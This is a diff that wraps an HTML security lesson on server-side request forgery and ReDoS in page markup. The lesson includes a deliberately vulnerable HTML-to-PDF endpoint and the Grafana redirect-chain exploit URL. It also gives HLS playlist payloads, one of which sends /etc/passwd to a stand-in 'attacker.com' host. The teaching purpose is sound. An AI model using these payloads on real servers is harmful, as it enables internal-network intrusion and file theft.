@@ -1,22 +1,37 @@
-<h1 id="lesson-9-more-server-risks">Lesson 9: More Server Risks</h1>
-<h2 id="introduction">Introduction</h2>
-<p>Previous lessons covered major classes of web vulnerabilities like
-XSS, CSRF, and injection attacks. This lesson covers several critical
-but often overlooked server-side vulnerabilities.</p>
-<h2 id="server-side-request-forgery-ssrf">Server-Side Request Forgery
-(SSRF)</h2>
-<p>Server-Side Request Forgery (SSRF) occurs when attackers can cause
-the server to send requests to arbitrary URLs. This is particularly
-dangerous in cloud environments because: 1. The server might have access
-to other internal services, such as sensitive databases, that aren’t
-meant to be publicly accessible 2. Internal services typically have
-minimal security because they assume requests only come from trusted
-sources 3. Network firewalls and access controls don’t protect against
-requests coming from within the network</p>
-<h3 id="example-vulnerability">Example Vulnerability</h3>
-<p>Consider a document conversion service that converts HTML to PDF:</p>
-<div class="sourceCode" id="cb1"><pre
-class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Vulnerable endpoint</span></span>
+<html>
+<head>
+  <style>
+    body {
+      max-width: 800px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    img,video {
+      max-width: 100%;
+    }
+  </style>
+</head>
+<body>
+  <h1 id="lesson-9-more-server-risks">Lesson 9: More Server Risks</h1>
+  <h2 id="introduction">Introduction</h2>
+  <p>Previous lessons covered major classes of web vulnerabilities like
+  XSS, CSRF, and injection attacks. This lesson covers several critical
+  but often overlooked server-side vulnerabilities.</p>
+  <h2 id="server-side-request-forgery-ssrf">Server-Side Request Forgery
+  (SSRF)</h2>
+  <p>Server-Side Request Forgery (SSRF) occurs when attackers can cause
+  the server to send requests to arbitrary URLs. This is particularly
+  dangerous in cloud environments because: 1. The server might have
+  access to other internal services, such as sensitive databases, that
+  aren’t meant to be publicly accessible 2. Internal services typically
+  have minimal security because they assume requests only come from
+  trusted sources 3. Network firewalls and access controls don’t protect
+  against requests coming from within the network</p>
+  <h3 id="example-vulnerability">Example Vulnerability</h3>
+  <p>Consider a document conversion service that converts HTML to
+  PDF:</p>
+  <div class="sourceCode" id="cb1"><pre
+  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Vulnerable endpoint</span></span>
 <span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">post</span>(<span class="st">&#39;/convert&#39;</span><span class="op">,</span> <span class="kw">async</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
 <span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> { html } <span class="op">=</span> req<span class="op">.</span><span class="at">body</span><span class="op">;</span></span>
 <span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a></span>
@@ -29,198 +44,206 @@ class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb1-
 <span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>  res<span class="op">.</span><span class="fu">type</span>(<span class="st">&#39;application/pdf&#39;</span>)<span class="op">.</span><span class="fu">send</span>(pdf)<span class="op">;</span></span>
 <span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
-<p>This service might be intended to only process simple HTML, or HTML
-that only includes images/styles from other parts of the website in
-question. (E.g. perhaps this is a document editing website, and we are
-implementing an “export as PDF” feature.)</p>
-<p>However, the code above does not do any filtering of the URLs that
-the page might request. For example, the HTML could include an
-<code>iframe</code> that loads sensitive information from an
-unauthenticated internal database, or it could include JavaScript to
-send network requests to internal services. When Puppeteer renders this
-HTML, it will leak confidential information.</p>
-<h3 id="ssrf-is-hard-to-spot">SSRF is hard to spot</h3>
-<p>SSRF can be much more subtle and difficult to spot than the above
-example.</p>
-<h4 id="ssrf-via-open-link-redirection">SSRF via open link
-redirection</h4>
-<p>Sometimes applications implement an endpoint that redirects to
-another URL specified in a query parameter. For example,
-<code>analytics.com/track?target=mysite.com</code> might be a tracking
-and analytics platform tracking clicks from marketing emails, or
-<code>auth.mycompany.com/login?next=mail.mycompany.com</code> might be
-implement authentication flows that redirect a user to the original page
-they requested before logging in.</p>
-<p>However, if these redirect endpoints don’t limit the possible
-redirect destinations, then attacker may exploit these open redirects to
-execute SSRF.</p>
-<p>As a concrete example, <a
-href="https://rhynorater.github.io/CVE-2020-13379-Write-Up">Grafana used
-to be vulnerable to such an attack</a>. Grafana had a
-<code>/avatar/:hash</code> endpoint that was used to serve the profile
-photo for a user. Here is how the endpoint worked:</p>
-<ul>
-<li>When the Grafana server received a request for a particular hash, it
-would fetch the photo from
-<code>https://secure.gravatar.com/avatar/${hash}</code></li>
-<li>The Gravatar <code>/avatar/:hash:</code> endpoint supported a
-<code>d</code> query parameter that would allow redirection to
-<code>i0.wp.com</code>, where some of the images were hosted. This
-feature was not normally used by Grafana, but because Grafana did not
-sanitize the input hash, a request to
-<code>https://mygrafanainstance.com/avatar/somehash%3Fd%3Dhello</code>
-would result in Gravatar redirecting to
-<code>i0.wp.com/hello</code>.</li>
-<li><code>i0.wp.com</code> is a Wordpress static image server. Wordpress
-supported embedding images from Blogspot, and the
-<code>i0.wp.com/{imageDomain}/{imagePath}</code> endpoint would redirect
-to <code>https://{imageDomain}/{imagePath}</code> <em>only if</em>
-<code>imageDomain</code> was a Blogspot domain
-(<code>*.bp.blogspot.com</code>). However, note that checking if
-<code>imageDomain</code> ends with <code>.bp.blogspot.com</code> is an
-insufficient check, as <code>evil.com?f=1.bp.blogspot.com</code>
-satisfies that check, but is an <code>evil.com</code> URL rather than a
-Blogspot URL.</li>
-</ul>
-<p>With all these factors combined, an attacker could make the following
-malicious request to Grafana:</p>
-<pre><code>https://grafanaHost/avatar/test%3fd%3dINTERNALSITE.com%25253f%253b%252fbp.blogspot.com</code></pre>
-<p>The Grafana server would send a request to Gravatar:</p>
-<pre><code>https://secure.gravatar.com/avatar/test?d=INTERNALSITE.com%253f%3b/1.bp.blogspot.com/</code></pre>
-<p>Gravatar would redirect to <code>i0.wp.com</code>:</p>
-<pre><code>http://i0.wp.com/INTERNALSITE.com%3f%;/1.bp.blogspot.com/</code></pre>
-<p>Finally, <code>i0.wp.com</code> would redirect to the SSRF
-target:</p>
-<pre><code>https://INTERNALSITE.com?;/1.bp.blogspot.com</code></pre>
-<p>This attack involved redirects through several different services run
-by different organizations. In isolation, each of these services seem
-reasonably implemented. However, the attacker could bounce redirects
-through the services until reaching an open redirect capable of
-directing to an arbitrary URL, resulting in the Grafana service sending
-an arbitrary request to this URL and returning the response to the
-attacker.</p>
-<p>The full writeup of this vulnerability, with additional details on
-how it might be exploited, is available <a
-href="https://rhynorater.github.io/CVE-2020-13379-Write-Up">here</a>.</p>
-<h4 id="ssrf-via-video-processing">SSRF via video processing</h4>
-<p>Another surprising vector for SSRF is in server-side image and video
-processing. When a user uploads media, the server will often process and
-compress the video to save storage space. Most often, servers will rely
-on a ubiquitous open-source project called <a
-href="https://www.ffmpeg.org/">FFmpeg</a> to process the video.</p>
-<p>FFmpeg supports a wide variety of input formats to process. This
-includes most standard video formats, but FFmpeg has such a wide
-featureset that it also includes surprising formats such as text files
-and <a
-href="https://www.fastpix.io/blog/a-complete-guide-to-m3u8-files-in-hls-streaming">HTTP
-Live Streaming (HLS) playlists</a>. An HLS playlist does not contain any
-video data; rather, it is a text file describing where to find smaller
-video files that make up a video stream, and FFmpeg will fetch these
-files while streaming video playback. By uploading a malicious HLS
-playlist in place of a normal video, an attacker can cause FFmpeg to
-make internal network requests from the video processing server.</p>
-<p>As a concrete example, <a
-href="https://hackerone.com/reports/1062888">TikTok used to be
-vulnerable to such an attack</a>. For example, an attacker could upload
-a <code>.avi</code> file with HLS directives embedded in it:</p>
-<pre><code>#EXTM3U
+  <p>This service might be intended to only process simple HTML, or HTML
+  that only includes images/styles from other parts of the website in
+  question. (E.g. perhaps this is a document editing website, and we are
+  implementing an “export as PDF” feature.)</p>
+  <p>However, the code above does not do any filtering of the URLs that
+  the page might request. For example, the HTML could include an
+  <code>iframe</code> that loads sensitive information from an
+  unauthenticated internal database, or it could include JavaScript to
+  send network requests to internal services. When Puppeteer renders
+  this HTML, it will leak confidential information.</p>
+  <h3 id="ssrf-is-hard-to-spot">SSRF is hard to spot</h3>
+  <p>SSRF can be much more subtle and difficult to spot than the above
+  example.</p>
+  <h4 id="ssrf-via-open-link-redirection">SSRF via open link
+  redirection</h4>
+  <p>Sometimes applications implement an endpoint that redirects to
+  another URL specified in a query parameter. For example,
+  <code>analytics.com/track?target=mysite.com</code> might be a tracking
+  and analytics platform tracking clicks from marketing emails, or
+  <code>auth.mycompany.com/login?next=mail.mycompany.com</code> might be
+  implement authentication flows that redirect a user to the original
+  page they requested before logging in.</p>
+  <p>However, if these redirect endpoints don’t limit the possible
+  redirect destinations, then attacker may exploit these open redirects
+  to execute SSRF.</p>
+  <p>As a concrete example, <a
+  href="https://rhynorater.github.io/CVE-2020-13379-Write-Up">Grafana
+  used to be vulnerable to such an attack</a>. Grafana had a
+  <code>/avatar/:hash</code> endpoint that was used to serve the profile
+  photo for a user. Here is how the endpoint worked:</p>
+  <ul>
+  <li>When the Grafana server received a request for a particular hash,
+  it would fetch the photo from
+  <code>https://secure.gravatar.com/avatar/${hash}</code></li>
+  <li>The Gravatar <code>/avatar/:hash:</code> endpoint supported a
+  <code>d</code> query parameter that would allow redirection to
+  <code>i0.wp.com</code>, where some of the images were hosted. This
+  feature was not normally used by Grafana, but because Grafana did not
+  sanitize the input hash, a request to
+  <code>https://mygrafanainstance.com/avatar/somehash%3Fd%3Dhello</code>
+  would result in Gravatar redirecting to
+  <code>i0.wp.com/hello</code>.</li>
+  <li><code>i0.wp.com</code> is a Wordpress static image server.
+  Wordpress supported embedding images from Blogspot, and the
+  <code>i0.wp.com/{imageDomain}/{imagePath}</code> endpoint would
+  redirect to <code>https://{imageDomain}/{imagePath}</code> <em>only
+  if</em> <code>imageDomain</code> was a Blogspot domain
+  (<code>*.bp.blogspot.com</code>). However, note that checking if
+  <code>imageDomain</code> ends with <code>.bp.blogspot.com</code> is an
+  insufficient check, as <code>evil.com?f=1.bp.blogspot.com</code>
+  satisfies that check, but is an <code>evil.com</code> URL rather than
+  a Blogspot URL.</li>
+  </ul>
+  <p>With all these factors combined, an attacker could make the
+  following malicious request to Grafana:</p>
+  <pre><code>https://grafanaHost/avatar/test%3fd%3dINTERNALSITE.com%25253f%253b%252fbp.blogspot.com</code></pre>
+  <p>The Grafana server would send a request to Gravatar:</p>
+  <pre><code>https://secure.gravatar.com/avatar/test?d=INTERNALSITE.com%253f%3b/1.bp.blogspot.com/</code></pre>
+  <p>Gravatar would redirect to <code>i0.wp.com</code>:</p>
+  <pre><code>http://i0.wp.com/INTERNALSITE.com%3f%;/1.bp.blogspot.com/</code></pre>
+  <p>Finally, <code>i0.wp.com</code> would redirect to the SSRF
+  target:</p>
+  <pre><code>https://INTERNALSITE.com?;/1.bp.blogspot.com</code></pre>
+  <p>This attack involved redirects through several different services
+  run by different organizations. In isolation, each of these services
+  seem reasonably implemented. However, the attacker could bounce
+  redirects through the services until reaching an open redirect capable
+  of directing to an arbitrary URL, resulting in the Grafana service
+  sending an arbitrary request to this URL and returning the response to
+  the attacker.</p>
+  <p>The full writeup of this vulnerability, with additional details on
+  how it might be exploited, is available <a
+  href="https://rhynorater.github.io/CVE-2020-13379-Write-Up">here</a>.</p>
+  <h4 id="ssrf-via-video-processing">SSRF via video processing</h4>
+  <p>Another surprising vector for SSRF is in server-side image and
+  video processing. When a user uploads media, the server will often
+  process and compress the video to save storage space. Most often,
+  servers will rely on a ubiquitous open-source project called <a
+  href="https://www.ffmpeg.org/">FFmpeg</a> to process the video.</p>
+  <p>FFmpeg supports a wide variety of input formats to process. This
+  includes most standard video formats, but FFmpeg has such a wide
+  featureset that it also includes surprising formats such as text files
+  and <a
+  href="https://www.fastpix.io/blog/a-complete-guide-to-m3u8-files-in-hls-streaming">HTTP
+  Live Streaming (HLS) playlists</a>. An HLS playlist does not contain
+  any video data; rather, it is a text file describing where to find
+  smaller video files that make up a video stream, and FFmpeg will fetch
+  these files while streaming video playback. By uploading a malicious
+  HLS playlist in place of a normal video, an attacker can cause FFmpeg
+  to make internal network requests from the video processing
+  server.</p>
+  <p>As a concrete example, <a
+  href="https://hackerone.com/reports/1062888">TikTok used to be
+  vulnerable to such an attack</a>. For example, an attacker could
+  upload a <code>.avi</code> file with HLS directives embedded in
+  it:</p>
+  <pre><code>#EXTM3U
 #EXT-X-MEDIA-SEQUENCE:0
 #EXTINF:10.0,
 http://internal.com/anything
 #EXT-X-ENDLIST</code></pre>
-<p>This will cause FFmpeg to send a network request to the specified URL
-and attempt to render the result in the output video.</p>
-<p>An attacker can even use FFmpeg to read a local file from the server
-and upload its contents to an attacker-controlled URL. This uses the <a
-href="https://ffmpeg.org/ffmpeg-protocols.html#subfile">subfile
-protocol</a> to send the contents of <code>/etc/passwd</code> to the
-attacker’s server:</p>
-<pre><code>#EXTM3U
+  <p>This will cause FFmpeg to send a network request to the specified
+  URL and attempt to render the result in the output video.</p>
+  <p>An attacker can even use FFmpeg to read a local file from the
+  server and upload its contents to an attacker-controlled URL. This
+  uses the <a
+  href="https://ffmpeg.org/ffmpeg-protocols.html#subfile">subfile
+  protocol</a> to send the contents of <code>/etc/passwd</code> to the
+  attacker’s server:</p>
+  <pre><code>#EXTM3U
 #EXT-X-MEDIA-SEQUENCE:0
 #EXTINF:10.0,
 concat:http://attacker.com/header.m3u8|subfile,,start,1,end,10000,,:/etc/passwd
 #EXT-X-ENDLIST</code></pre>
-<p>The full writeup of this vulnerability is available <a
-href="https://hackerone.com/reports/1062888">here</a>.</p>
-<h3 id="prevention">Prevention</h3>
-<p>SSRF vulnerabilities can be prevented through multiple layers of
-defense:</p>
-<ul>
-<li><p><strong>Validate and sanitize user input:</strong> SSRF is
-usually triggered by abnormal inputs, so validating the expected format
-of user inputs can help to avoid it. For example, in the Grafana link
-redirection SSRF, we could have validated that the input hash only
-contained hexadecimal characters. Building destination URLs with
-<code>new URL()</code> instead of string concatenation can also help to
-avoid SSRF.</p></li>
-<li><p><strong>Disable redirection when fetching URLs:</strong> Unless
-redirection is required for an application to function correctly, we can
-reduce the likelihood of SSRF via link redirection by disabling
-redirection. You can do this with the <code>fetch()</code> API by
-passing <code>{redirect: 'error'}</code>:</p>
-<pre><code>const response = await fetch(url, {redirect: &#39;error&#39;})</code></pre></li>
-<li><p><strong>Isolate and sandbox services:</strong> If a third-party
-tool may have unexpected functionality (e.g. ffmpeg), it is best to run
-it in an isolated container with no sensitive files on the local
-filesystem and no privileged network access to internal
-services.</p></li>
-<li><p><strong>Require authentication for internal services:</strong> If
-an attacker needs to authenticate requests in order to perform actions
-in an internal network, then SSRF becomes much harder.</p></li>
-</ul>
-<h2 id="regular-expression-denial-of-service-redos">Regular Expression
-Denial of Service (ReDoS)</h2>
-<p>Regular Expression Denial of Service (ReDoS) occurs when a regular
-expression can take exponential time to match certain inputs. This
-vulnerability is particularly severe in Node.js for several reasons: 1.
-Node.js processes regex matching on the main event loop, so a slow regex
-blocks ALL requests to the server 2. JavaScript’s regex engine uses
-backtracking, which can lead to exponential matching time 3. Many
-Node.js applications use regex for input validation, making this a
-common attack vector 4. The single-threaded nature of Node.js means one
-blocked request will stall the server for all users</p>
-<h3 id="catastrophic-backtracking">Catastrophic backtracking</h3>
-<p>ReDoS is caused by regular expressions that might match a target
-string in many different ways. Certain regex patterns allow for a vast
-number of possible ways to match the same string, so the engine will
-spend a huge amount of time exploring (and backtracking through) all
-these possibilities. This process can become exponential in runtime, and
-is known as <em>catastrophic backtracking</em>.</p>
-<p>When a pattern has nested quantifiers or complex alternations (e.g.,
-<code>+(a+)+</code>, <code>(a|b)*c</code>, or multiple overlapping
-groups), the regex engine attempts one path to match a target string,
-fails, then backtracks to try another path, fails again, and continues
-this process until it (possibly) finds a match or definitively fails.
-For large inputs crafted by attackers, the sheer number of backtracking
-attempts can block the main event loop for seconds – or even minutes –
-because Node.js is single-threaded. This problem caused a <a
-href="https://blog.cloudflare.com/details-of-the-cloudflare-outage-on-july-2-2019/">global
-outage for Cloudflare in 2019</a>, and the post-mortem writeup for that
-outage does an excellent job of explaining <a
-href="https://blog.cloudflare.com/details-of-the-cloudflare-outage-on-july-2-2019/#appendix-about-regular-expression-backtracking">how
-catastrophic backtracking happens</a>.</p>
-<h3 id="prevention-1">Prevention</h3>
-<p>You can set up lint rules to detect regexes that are susceptible to
-catastrophic backtracking, e.g. <code>detect-unsafe-regex</code> from <a
-href="https://github.com/eslint-community/eslint-plugin-security">eslint-plugin-security</a>.</p>
-<p>Even better, you can run NodeJS with an <a
-href="https://v8.dev/blog/non-backtracking-regexp">alternative regular
-expression engine</a> that is not susceptible to catastrophic
-backtracking. The <code>--enable-experimental-regexp-engine</code> flag
-allows you to write regexes with an <code>l</code> suffix
-(e.g. <code>/hi.*there/l</code>), which will be executed on the new
-linear-time engine, and which will throw an error for unsafe regexes
-that cannot be executed without risking catastrophic backtracking. To
-help support existing codebases, the
-<code>--enable-experimental-regexp-engine-on-excessive-backtracks</code>
-flag will cause V8 to fall back to this engine if excessive backtracking
-is detected, protecting you against worst-case ReDoS.</p>
-<h2 id="summary">Summary</h2>
-<p>Server-side vulnerabilities like SSRF and ReDoS can compromise entire
-applications by exploiting server behavior. SSRF occurs when attackers
-can make the server send requests to arbitrary URLs, exposing internal
-services and sensitive data. These vulnerabilities often emerge subtly
-through features like link redirection or media processing. ReDoS
-vulnerabilities arise when regular expressions can take exponential time
-to match certain inputs, potentially bringing down Node.js servers
-through catastrophic backtracking.</p>
+  <p>The full writeup of this vulnerability is available <a
+  href="https://hackerone.com/reports/1062888">here</a>.</p>
+  <h3 id="prevention">Prevention</h3>
+  <p>SSRF vulnerabilities can be prevented through multiple layers of
+  defense:</p>
+  <ul>
+  <li><p><strong>Validate and sanitize user input:</strong> SSRF is
+  usually triggered by abnormal inputs, so validating the expected
+  format of user inputs can help to avoid it. For example, in the
+  Grafana link redirection SSRF, we could have validated that the input
+  hash only contained hexadecimal characters. Building destination URLs
+  with <code>new URL()</code> instead of string concatenation can also
+  help to avoid SSRF.</p></li>
+  <li><p><strong>Disable redirection when fetching URLs:</strong> Unless
+  redirection is required for an application to function correctly, we
+  can reduce the likelihood of SSRF via link redirection by disabling
+  redirection. You can do this with the <code>fetch()</code> API by
+  passing <code>{redirect: 'error'}</code>:</p>
+  <pre><code>const response = await fetch(url, {redirect: &#39;error&#39;})</code></pre></li>
+  <li><p><strong>Isolate and sandbox services:</strong> If a third-party
+  tool may have unexpected functionality (e.g. ffmpeg), it is best to
+  run it in an isolated container with no sensitive files on the local
+  filesystem and no privileged network access to internal
+  services.</p></li>
+  <li><p><strong>Require authentication for internal services:</strong>
+  If an attacker needs to authenticate requests in order to perform
+  actions in an internal network, then SSRF becomes much
+  harder.</p></li>
+  </ul>
+  <h2 id="regular-expression-denial-of-service-redos">Regular Expression
+  Denial of Service (ReDoS)</h2>
+  <p>Regular Expression Denial of Service (ReDoS) occurs when a regular
+  expression can take exponential time to match certain inputs. This
+  vulnerability is particularly severe in Node.js for several reasons:
+  1. Node.js processes regex matching on the main event loop, so a slow
+  regex blocks ALL requests to the server 2. JavaScript’s regex engine
+  uses backtracking, which can lead to exponential matching time 3. Many
+  Node.js applications use regex for input validation, making this a
+  common attack vector 4. The single-threaded nature of Node.js means
+  one blocked request will stall the server for all users</p>
+  <h3 id="catastrophic-backtracking">Catastrophic backtracking</h3>
+  <p>ReDoS is caused by regular expressions that might match a target
+  string in many different ways. Certain regex patterns allow for a vast
+  number of possible ways to match the same string, so the engine will
+  spend a huge amount of time exploring (and backtracking through) all
+  these possibilities. This process can become exponential in runtime,
+  and is known as <em>catastrophic backtracking</em>.</p>
+  <p>When a pattern has nested quantifiers or complex alternations
+  (e.g., <code>+(a+)+</code>, <code>(a|b)*c</code>, or multiple
+  overlapping groups), the regex engine attempts one path to match a
+  target string, fails, then backtracks to try another path, fails
+  again, and continues this process until it (possibly) finds a match or
+  definitively fails. For large inputs crafted by attackers, the sheer
+  number of backtracking attempts can block the main event loop for
+  seconds – or even minutes – because Node.js is single-threaded. This
+  problem caused a <a
+  href="https://blog.cloudflare.com/details-of-the-cloudflare-outage-on-july-2-2019/">global
+  outage for Cloudflare in 2019</a>, and the post-mortem writeup for
+  that outage does an excellent job of explaining <a
+  href="https://blog.cloudflare.com/details-of-the-cloudflare-outage-on-july-2-2019/#appendix-about-regular-expression-backtracking">how
+  catastrophic backtracking happens</a>.</p>
+  <h3 id="prevention-1">Prevention</h3>
+  <p>You can set up lint rules to detect regexes that are susceptible to
+  catastrophic backtracking, e.g. <code>detect-unsafe-regex</code> from
+  <a
+  href="https://github.com/eslint-community/eslint-plugin-security">eslint-plugin-security</a>.</p>
+  <p>Even better, you can run NodeJS with an <a
+  href="https://v8.dev/blog/non-backtracking-regexp">alternative regular
+  expression engine</a> that is not susceptible to catastrophic
+  backtracking. The <code>--enable-experimental-regexp-engine</code>
+  flag allows you to write regexes with an <code>l</code> suffix
+  (e.g. <code>/hi.*there/l</code>), which will be executed on the new
+  linear-time engine, and which will throw an error for unsafe regexes
+  that cannot be executed without risking catastrophic backtracking. To
+  help support existing codebases, the
+  <code>--enable-experimental-regexp-engine-on-excessive-backtracks</code>
+  flag will cause V8 to fall back to this engine if excessive
+  backtracking is detected, protecting you against worst-case ReDoS.</p>
+  <h2 id="summary">Summary</h2>
+  <p>Server-side vulnerabilities like SSRF and ReDoS can compromise
+  entire applications by exploiting server behavior. SSRF occurs when
+  attackers can make the server send requests to arbitrary URLs,
+  exposing internal services and sensitive data. These vulnerabilities
+  often emerge subtly through features like link redirection or media
+  processing. ReDoS vulnerabilities arise when regular expressions can
+  take exponential time to match certain inputs, potentially bringing
+  down Node.js servers through catastrophic backtracking.</p>
+</body>
+</html>
